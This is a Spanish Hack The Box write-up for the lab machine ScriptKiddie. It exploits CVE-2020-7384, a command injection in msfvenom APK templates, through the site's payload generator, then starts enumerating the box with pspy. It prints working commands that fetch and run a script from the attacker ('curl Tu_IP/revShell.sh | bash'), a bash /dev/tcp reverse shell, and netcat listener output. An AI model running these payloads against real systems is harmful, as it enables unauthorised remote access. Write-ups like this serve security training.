---
title: "ScriptKiddie - Hack The Box"
date: 2023-05-08
draft: false
slug: "htb-writeup-scriptkiddie"
excerpt: "Esta fue una máquina un poco complicada, lo que hicimos fue analizar los campos/funciones de la página web, así encontramos que podemos utilizar el Exploit CVE-2020-7384 para conectarnos de manera remota a la máquina víctima, después de enumerar lo que había dentro como el usuario Kid, analizamos 2 scripts y las tareas CRON activas (esto con pspy) lo que nos permitira hacer pivoting para conectarnos a otro usuario llamado pwn, esto mediante inyección de comandos. El usuario pwn tendrá permisos para usar la consola de Metasploit, dentro de la consola, usaremos la terminal de Ruby para convertirnos en Root."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Werkzeug", "Msfvenom Exploitation - APK Template Command Injection", "CVE-2020-7384 (Msfvenom Exploitation - APK TCI)", "Abusing Logs", "Abusing CRON Jobs", "Command Injection (CI)", "Pivoting", "Privesc - Abusing Sudoers Privileges", "Privesc - Msfconsole Privilege Escalation", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "searchsploit"
  - "ping"
  - "python"
  - "tcpdump"
  - "nc"
  - "python3"
  - "chown"
  - "curl"
  - "bash"
  - "wget"
  - "echo"
  - "metasploit framework(msfconsole)"
links:
  - "https://werkzeug.palletsprojects.com/en/2.3.x/"
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug"
  - "https://github.com/DominicBreuker/pspy/releases"
  - "https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html"
  - "https://github.com/rapid7/metasploit-framework/issues/14130"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-scriptkiddie/scriptkiddie_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.10.226
PING 10.10.10.226 (10.10.10.226) 56(84) bytes of data.
64 bytes from 10.10.10.226: icmp_seq=1 ttl=63 time=131 ms
64 bytes from 10.10.10.226: icmp_seq=2 ttl=63 time=131 ms
64 bytes from 10.10.10.226: icmp_seq=3 ttl=63 time=132 ms
64 bytes from 10.10.10.226: icmp_seq=4 ttl=63 time=132 ms

--- 10.10.10.226 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 131.075/131.562/132.170/0.417 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.226 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 14:27 CST
Initiating SYN Stealth Scan at 14:27
Scanning 10.10.10.226 [65535 ports]
Discovered open port 22/tcp on 10.10.10.226
Completed SYN Stealth Scan at 14:28, 26.68s elapsed (65535 total ports)
Nmap scan report for 10.10.10.226
Host is up, received user-set (0.99s latency).
Scanned at 2023-05-08 14:27:40 CST for 27s
Not shown: 51771 filtered tcp ports (no-response), 13763 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.79 seconds
           Raw packets sent: 125069 (5.503MB) | Rcvd: 13807 (552.300KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Mmmmm qué raro, solamente me muestra un puerto, vamos a hacer el escaneo de servicios, pero no especificaremos ningún puerto.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV 10.10.10.226 -oN targeted                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 14:36 CST
Nmap scan report for 10.10.10.226
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA)
|   256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA)
|_  256 8bcf4182c6acef9180377cc94511e843 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)

|_http-title: k1d'5 h4ck3r t00l5
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.77 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Ya nos apareció otro puerto, no sé por qué no se mostró en el escaneo de puertos, pero bueno, al parecer es una página web, vamos a analizarla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#Web}

Para entrar, escribe la IP de la máquina y agrega el puerto 5000.

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura1.png">
</p>

Mmmmm, a simple vista, no veo nada que más que los 3 campos. Usemos la herramienta **whatweb**, para saber algo que se nos esté pasando:
```bash
whatweb http://10.10.10.226:5000/                                                                                 
http://10.10.10.226:5000/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.16.1 Python/3.8.5], IP[10.10.10.226], Python[3.8.5], Title[k1d'5 h4ck3r t00l5], Werkzeug[0.16.1]
```

Veo que, aparte de que está hecho en **Python**, están usando el servicio **Werkzeug**, investiguemos de que se trata:

| **Servicio Werkzeug** |
|:-----------:|
| *Werkzeug es una completa biblioteca de aplicaciones web WSGI. Comenzó como una simple colección de varias utilidades para aplicaciones WSGI y se ha convertido en una de las bibliotecas de utilidades WSGI más avanzadas. Un servidor WSGI (Web Server Gateway Interface) es necesario para las aplicaciones web Python ya que un servidor web no puede comunicarse directamente con Python. WSGI es una interfaz entre un servidor web y una aplicación web basada en Python.* |

Vaya, es una herramienta alemana, quizá en **HackTricks** tengan algo útil sobre esta librería.

Aquí hay algo:
* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug" target="_blank">Werkzeug / Flask Debug</a>

De acuerdo al post, si la librería tiene activo **debug**, podemos activar una consola interactiva. 

Probémoslo:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura2.png">
</p>

No pues no, no sirvió esto. 

Veamos que hacen los campos que vienen en la página.

### Probando Funciones de Página Web {#Pruebas}

Primero tenemos a **NMAP**, hagamos una prueba:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura3.png">
</p>

Como tal, hace un escaneo a cualquier IP para encontrar los 100 puertos más comunes/populares, incluso a la misma máquina víctima si se lo indicamos, pero de momento no creo que nos sirva de mucho.

Veamos qué opciones nos da **Payloads**:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura4.png">
</p>

Al parecer, podemos crear payloads para 3 tipos de sistemas que son **Windows, Linux y Android**, que este último me da curiosidad de porque lo ponen.

Vamos a crear un ejemplo:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura7.png">
</p>

Le indique una IP random y use una plantilla (esto se hace con el **parámetro -x** de **msfvenom** para usar un archivo ejecutable como plantilla para tu payload), esto nos genera un ejecutable que podemos descargar:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura8.png">
</p>

Aun así, no veo como podamos usar esto de momento.

Veamos el último campo **Sploits**, busquemos algo random:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura5.png">
</p>

Parece que unicamente busca exploits para los servicios, sistemas, etc que le indiquemos.

Apliquemos Fuzzing para ver si no aparece algo más que se nos este escapando.

### Fuzzing {#Fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.226:5000/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.226:5000/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000014:   308        3 L      24 W       257 Ch      "http://10.10.10.226:5000//"                                          
000045240:   308        3 L      24 W       257 Ch      "http://10.10.10.226:5000//"                                          

Total time: 1400.216
Processed Requests: 220560
Filtered Requests: 220545
Requests/sec.: 157.5185
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://10.10.10.226:5000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.226:5000/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 220546 / 220547 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Tampoco nos muestra nada, entonces, todo apunta a que debemos buscar la manera de ganar acceso con cualquiera de las funciones de la página web.

## Explotación de Vulnerabilidades {#Explotacion}

### Buscando y Configurando un Exploit {#Exploit}

Si recordamos nuestro análisis, tenemos 3 servicios activos en la página web, si ocupamos la función **Sploits** para cada uno, nos daremos cuenta que el que es posible que pueda ser vulnerable sea la función **Payloads**.

Lo que vamos a buscar, será la herramienta **Msfvenom**, que es la que está operando en el campo **Payloads** de la página web:

Vamos a buscarlo en nuestro Kali y veras porque pienso esto:
```bash
searchsploit msfvenom                   
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path

|---|---|
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                | multiple/local/49491.py

|---|---|
Shellcodes: No Results
Papers: No Results
```

Si te das cuenta, genera una APK, que es una de las opciones que podemos cargar a la página web al elegir la opción de **Android** y asignarle una plantilla.

No estoy seguro de que sea esa versión la que está usando la máquina víctima, pero no perdemos nada con intentarlo.

#### Probando Exploit: Metasploit Framework 6.0.11 - msfvenom APK template command injection {#PruebaExp}

```bash
searchsploit -m multiple/local/49491.py 
  Exploit: Metasploit Framework 6.0.11 - msfvenom APK template command injection
      URL: https://www.exploit-db.com/exploits/49491
     Path: /usr/share/exploitdb/exploits/multiple/local/49491.py
    Codes: CVE-2020-7384
 Verified: False
File Type: Python script, ASCII text executable
```

Analicemos este Exploit.

Por lo que entiendo, el Exploit va a generar una APK maliciosa que ejecutara un comando que nosotros pongamos, en este caso viene ya uno por defecto que aplica el **comando id** junto a un mensaje que indicaria la inyección de comandos, este comando se guarda como payload y se encodea en **base64** para luego de encodearse e interpretarse con **sh** (supongo que para evitar ser detectado, osea como un bypass), al final nos dira que usemos la **APK** como plantilla y así podamos crear un payload con **Msfvenom** para cargarlo (esto último no lo haremos porque usaremos la **APK** como plantilla en la función **Payloads** de la página web). Esta **APK** se guardará en un archivo temporal dentro de nuestra máquina, por lo que deberemos darle permisos a nuestro usuario principal para que la podamos cargar a la página web.

Hagamos una prueba, vamos por pasos:

* Vamos a cambiar el script, pidiendo que nos mande una **traza ICMP**, para saber si podemos usar otros comandos:
```python
payload = 'ping -c 4 Tu_IP'
```

* Genera la **APK**:
```bash
python Msfvenom_Exploit.py                           
[+] Manufacturing evil apkfile
Payload: ping -c 4 Tu_IP
-dname: CN='|echo Q2hlIGNoaXNtb3NvLCBxdWUgaGFjZXMgcmV2aXNhbmRvIGVzdG8gd2UK | base64 -d | sh #
  adding: empty (stored 0%)
Generando par de claves RSA de 2,048 bits para certificado autofirmado (SHA256withRSA) con una validez de 90 días
        para: CN="'|echo Q2hlIGNoaXNtb3NvLCBxdWUgaGFjZXMgcmV2aXNhbmRvIGVzdG8gd2UK | base64 -d | sh #"
jar signed.
Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.
[+] Done! apkfile is at /tmp/tmpjjynuoof/evil.apk
Do: msfvenom -x /tmp/tmpjjynuoof/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

* Para poder subir el archivo, démosle permisos a nuestro usuario principal para cargar el **APK** desde el directorio que nos indica a la página web:
```bash
chown tu_usuario:tu_usuario -R /tmp/tmpjjynuoof
```

* O simplemente usa mv para mover la **APK maliciosa** a tu directorio de trabajo:
```bash
mv /tmp/tmpjjynuoof/evil.apk .
```
Cualquiera de las dos es valida.

* Antes de cargar la **APK**, inicia la herramienta **tcpdump** para que capture la **traza ICMP** en caso de que funcione:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

* Carga la **APK** a la página web:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura6.png">
</p>

En la IP, usaremos la del proxy que solemos usar por como está configurada la página web, aunque creo que funciona igual con la misma IP, pero mejor vayamos a lo seguro.

* Resultado
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:58:06.449418 IP 10.10.10.226 > ****: ICMP echo request, id 1, seq 1, length 64
18:58:06.449429 IP **** > 10.10.10.226: ICMP echo reply, id 1, seq 1, length 64
18:58:07.449374 IP 10.10.10.226 > ****: ICMP echo request, id 1, seq 2, length 64
18:58:07.449384 IP **** > 10.10.10.226: ICMP echo reply, id 1, seq 2, length 64
18:58:08.449024 IP 10.10.10.226 > ****: ICMP echo request, id 1, seq 3, length 64
18:58:08.449034 IP **** > 10.10.10.226: ICMP echo reply, id 1, seq 3, length 64
18:58:09.448525 IP 10.10.10.226 > ****: ICMP echo request, id 1, seq 4, length 64
18:58:09.448535 IP **** > 10.10.10.226: ICMP echo reply, id 1, seq 4, length 64
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```

¡Excelente! Podemos usar este Exploit para ganar acceso.

### Ganando Acceso a la Máquina Usando Exploit de Msfvenom {#Acceso}

Hice varias pruebas para aplicar una **Reverse Shell** que me conectara a la máquina víctima que resultaron fallidas, solamente una si funciono y es que como esta interpretando los comandos que tu uses, es posible que pueda interpretar un archivo que contenga la **Reverse Shell**, así que vamos a intentarlo.

**Opción 1**:
* Vamos a cambiar el script, aplicaremos **curl** para que pueda leer e interpretar un archivo que contiene una **Reverse Shell**:
```python
payload = 'curl Tu_IP/revShell.sh | bash'
```

* Crea el archivo que contenga la **Reverse Shell**:
```bash
nano revShell.sh
---
#!/bin/bash
bash -i >& /dev/tcp/Tu_IP/443 0>&1
```

* Abre un servidor en **Python**, en donde tengas el archivo **index.html**:
```bash
python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Genera la **APK** y mueve la **APK** a tu directorio de trabajo:
```bash
python Msfvenom_exploit.py
[+] Manufacturing evil apkfile
Payload: curl Tu_IP/revShell.sh | bash
-dname: CN='|echo UXVlIGhhY2VzIGRlY29kaWZpY2FuZG8gZXN0byBwaW5jaGUgY2hpc21vc28geGQK | base64 -d | sh #

  adding: empty (stored 0%)
Generando par de claves RSA de 2,048 bits para certificado autofirmado (SHA256withRSA) con una validez de 90 días
        para: CN="'|echo UXVlIGhhY2VzIGRlY29kaWZpY2FuZG8gZXN0byBwaW5jaGUgY2hpc21vc28geGQK | base64 -d | sh #"
jar signed.
*
Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.
[+] Done! apkfile is at /tmp/tmp1r8ituck/evil.apk
Do: msfvenom -x /tmp/tmp1r8ituck/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

* Abre una **netcat** con el puerto que pusiste en el archivo **revShell.sh**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Carga el archivo a la página:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura6.png">
</p>

* Resultado:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.226] 46504
bash: cannot set terminal process group (826): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ whoami
whoami
kid
```

**Opción 2**:
* Vamos a cambiar el script, aplicaremos **curl** para que pueda leer e interpretar un archivo que contiene una **Reverse Shell**:
```python
payload = 'curl Tu_IP | bash'
```

* Vamos a crear un archivo en **HTML** con una instrucción en **Bash** para conectarnos a la máquina, esto sería nuestra **Reverse Shell**:
```bash
nano index.html
#!/bin/bash
bash -i >& /dev/tcp/Tu_IP/443 0>&1
```

* Abre un servidor en **Python**, en donde tengas el archivo **index.html**:
```bash
python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Genera la **APK** y dale los permisos a tu usuario principal:
```bash
python3 Msfvenom_Exploit.py                        
[+] Manufacturing evil apkfile
Payload: curl Tu_IP | bash
-dname: CN='|echo T3RyYSB2ZXogdHUgcGluY2hlIGNoaXNtb3NvLCB0ZSB3b2EgaGFja2VhciB4ZAo= | base64 -d | sh #
  adding: empty (stored 0%)
Generando par de claves RSA de 2,048 bits para certificado autofirmado (SHA256withRSA) con una validez de 90 días
        para: CN="'|echo T3RyYSB2ZXogdHUgcGluY2hlIGNoaXNtb3NvLCB0ZSB3b2EgaGFja2VhciB4ZAo= | base64 -d | sh #"
jar signed.
*
Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.
[+] Done! apkfile is at /tmp/tmpp003jckm/evil.apk
Do: msfvenom -x /tmp/tmpp003jckm/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
chown usuario:usuario -R /tmp/tmpp003jckm
```

* Abre una **netcat** con el puerto que pusiste en el archivo **index.html**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```
* Carga el archivo a la página:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura6.png">
</p>

* Resultado:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.226] 48542
bash: cannot set terminal process group (894): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ whoami
whoami
kid
kid@scriptkiddie:~/html$
```

* Ya solo busca la flag:
```bash
kid@scriptkiddie:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
kid@scriptkiddie:~$
kid@scriptkiddie:~/html$ cd /home
cd /home
kid@scriptkiddie:/home$ ls
ls
kid
pwn
kid@scriptkiddie:/home$ cd kid  
cd kid
kid@scriptkiddie:~$ ls
ls
html
logs
snap
user.txt
kid@scriptkiddie:~$ cat user.txt
cat user.txt
```
Ahora, veamos como obtener acceso como **Root**.

## Post Explotación {#Post}

### Enumeración de Usuario Kid y Analizando Script app.py {#Maquina}

Esto va a estar un poco complicado de entender, pues lo que haremos será **Pivoting**. Pero primero, analicemos que hay dentro del usuario **Kid**.

**IMPORTANTE**

Para continuar, es necesario que obtengas una shell interactiva, puedes checar en mi blog la publicación **Notas Pentesting**, ahí te explico como hacerlo.

Una vez que ya tengas la shell interactiva, continuemos.

------------

Veamos qué privilegios tenemos:
```bash
kid@scriptkiddie:~$ whoami
kid
kid@scriptkiddie:~$ id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
kid@scriptkiddie:~$ sudo -l
[sudo] password for kid: 
kid@scriptkiddie:~$
```

Necesitamos contraseñas, veamos qué cosillas hay por aquí:
```bash
kid@scriptkiddie:~$ ls -la
total 60
drwxr-xr-x 11 kid  kid  4096 Feb  3  2021 .
drwxr-xr-x  4 root root 4096 Feb  3  2021 ..
lrwxrwxrwx  1 root kid     9 Jan  5  2021 .bash_history -> /dev/null
-rw-r--r--  1 kid  kid   220 Feb 25  2020 .bash_logout
-rw-r--r--  1 kid  kid  3771 Feb 25  2020 .bashrc
drwxrwxr-x  3 kid  kid  4096 Feb  3  2021 .bundle
drwx------  2 kid  kid  4096 Feb  3  2021 .cache
drwx------  4 kid  kid  4096 Feb  3  2021 .gnupg
drwxrwxr-x  3 kid  kid  4096 Feb  3  2021 .local
drwxr-xr-x  9 kid  kid  4096 Feb  3  2021 .msf4
-rw-r--r--  1 kid  kid   807 Feb 25  2020 .profile
drwx------  2 kid  kid  4096 Feb 10  2021 .ssh
-rw-r--r--  1 kid  kid     0 Jan  5  2021 .sudo_as_admin_successful
drwxrwxr-x  5 kid  kid  4096 Feb  3  2021 html
drwxrwxrwx  2 kid  kid  4096 Feb  3  2021 logs
drwxr-xr-x  3 kid  kid  4096 Feb  3  2021 snap
-r--------  1 kid  kid    33 May  8 20:23 user.tx
```

Vamos a revisar los directorios de **html** y el de **logs**.

Primero el de **html** que no revisamos al principio:
```bash
kid@scriptkiddie:~$ cd html/
kid@scriptkiddie:~/html$ ls -la
total 28
drwxrwxr-x  5 kid kid 4096 Feb  3  2021 .
drwxr-xr-x 11 kid kid 4096 Feb  3  2021 ..
drwxrwxr-x  2 kid kid 4096 Feb  3  2021 __pycache__
-rw-rw-r--  1 kid kid 4408 Feb  3  2021 app.py
drwxrwxr-x  3 kid kid 4096 Feb  3  2021 static
drwxrwxr-x  2 kid kid 4096 Feb  3  2021 templates
```

Hay un archivo en **Python** y creo que es la página web, veamos:
```bash
kid@scriptkiddie:~/html$ cat app.py 
import datetime
import os
import random
...

regex_ip = re.compile(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
regex_alphanum = re.compile(r'^[A-Za-z0-9 \.]+$')
OS_2_EXT = {'windows': 'exe', 'linux': 'elf', 'android': 'apk'}

app = Flask(__name__)
...
```
Si es para la página web, analicemos un poco el script.

Hay dos funciones que me parecen interesantes:

* La primera es la función **scan**:
```python
def scan(ip):
    if regex_ip.match(ip):
        if not ip == request.remote_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'):
            stime = random.randint(200,400)/100
            time.sleep(stime)
            result = f"""Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M")} UTC\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds""".encode()
        else:
            result = subprocess.check_output(['nmap', '--top-ports', '100', ip])
        return render_template('index.html', scan=result.decode('UTF-8', 'ignore'))
    return render_template('index.html', scanerror="invalid ip")
```
Entiendo que esta función obtiene la IP mediante una variable llamada **regex_ip**, si la IP es valida aplica el escaneo con **Nmap**.

Pero lo curioso y que me interesa es esto:
```python
{datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M")}
```
Lo curioso es por qué razón pide la fecha para poder hacer el escaneo, no lo había visto antes y quizá nos sirva más adelante.

* La segunda es la función **searchsploit**:
```python
def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")
```

Esta función utiliza la variable **regex_alphanum** para aplicar la busqueda de Exploit con **searchsploit**, esto lo hace en caso de que sea texto, caso contrario abrira el **archivo hackers** para agregar la fecha y el contenido de la **variable srcip** (que creo que es una IP) para al final mostrar un mensaje de que lo dejemos de hackear.

Quiero pensar que hizo esto para evitar alguna inyección en los campos de la página web.

Entiendo que el archivo **hackers**, va a guardar la fecha que se obtenga con el comando **datetime** para usarse después y se obtiene la IP con la función **srcip**. No se para que se ocupe, vamos a revisar ese archivo.

Ahora vayamos con el directorio **logs**. Lo único que hay, es el archivo **hackers**, pero no contiene nada:
```bash
kid@scriptkiddie:~$ cd logs/
kid@scriptkiddie:~/logs$ ls -la
total 8
drwxrwxrwx  2 kid kid 4096 Feb  3  2021 .
drwxr-xr-x 11 kid kid 4096 Feb  3  2021 ..
-rw-rw-r--  1 kid pwn    0 Feb  3  2021 hackers
kid@scriptkiddie:~/logs$ cat hackers 
kid@scriptkiddie:~/logs$
```
Puede que este ocurriendo un proceso en segundo plano, vamos a comprobarlo con la herramienta **pspy**.

#### Encontrando Procesos Activos en Máquina Víctima con Pspy {#Pspy}

¿Qué es lo que hace esta herramienta?

| **Herramienta PsPy** |
|:-----------:|
| *pspy es una herramienta de línea de comandos diseñada para espiar procesos sin necesidad de permisos de root. Le permite ver comandos ejecutados por otros usuarios, cron jobs, etc. mientras se ejecutan. Genial para enumerar sistemas Linux en CTFs. También es genial para demostrar a tus colegas por qué pasar secretos como argumentos en la línea de comandos es una mala idea. La herramienta recoge la información de los escaneos procfs. Los vigilantes Inotify colocados en partes seleccionadas del sistema de archivos activan estos escaneos para capturar procesos de corta duración.* |

Aca te dejo el **GitHub**:
* <a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy - unprivileged Linux process snooping</a>

Descarga cualquiera, aunque yo use la version 64.

Una vez que lo tengas, levanta un servidor de **Python** para que con el comando **wget** podamos descargarlo de nuestra máquina a la máquina víctima:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.226 - - [12/Aug/2024 20:19:20] "GET /pspy64 HTTP/1.1" 200 -
```

Ahora usa el **comando wget** y de una vez dale permisos de ejecución:
```bash
kid@scriptkiddie:~$ wget http://TuIP/pspy64
wget http://TuIP/pspy64
--2024-08-13 02:19:21--  http://TuIP/pspy64
Connecting to TuIP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’
3000K .......... .......... .......... ..                   100% 10.8M=1.0s

2024-08-13 02:19:22 (2.95 MB/s) - ‘pspy64’ saved [3104768/3104768]

kid@scriptkiddie:~$ ls
ls
html
logs
pspy64
snap
user.txt
kid@scriptkiddie:~$ chmod +x pspy64     
chmod +x pspy64
kid@scriptkiddie:~$
```

Por último, ejecuta **pspy**:
```bash
kid@scriptkiddie:~$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/05/08 02:19:47 CMD: UID=1000  PID=446398 | ./pspy64 
2023/05/08 02:19:47 CMD: UID=1000  PID=446291 | bash -i 
2023/05/08 02:19:47 CMD: UID=1000  PID=446242 | /bin/sh 
2023/05/08 02:19:47 CMD: UID=1000  PID=446241 | nc Tu_IP 443
```

